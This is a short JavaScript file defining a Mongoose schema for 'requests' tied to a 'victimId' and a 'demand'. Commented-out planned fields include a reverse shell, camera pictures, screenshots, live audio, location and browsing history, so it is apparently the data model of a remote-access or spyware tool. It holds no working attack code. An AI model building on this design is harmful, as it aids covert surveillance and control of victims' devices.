import mongoose from "mongoose";

const requestSchema = new mongoose.Schema({
    id: { type: mongoose.Schema.Types.ObjectId, required: true },
    victimId: { type: String, required: true },
    demand: { type : String, default : "", required: false },
    fulfilled: { type: Boolean, default: false, required: false },
    fulfilledAt : { type: String, required: false },

    // reverseShell: { type: String, required: false }, TODO
    // cameraPicture: { type: String, required: false },
    // screenshot: { type: String, required: false },
    // liveAudio: { type: String, required: false }, TODO
    // location: { type: String, required: false },
    // history: { type: String, required: false },
}, { timestamps: true, strict: false });

export default mongoose.model('Request', requestSchema);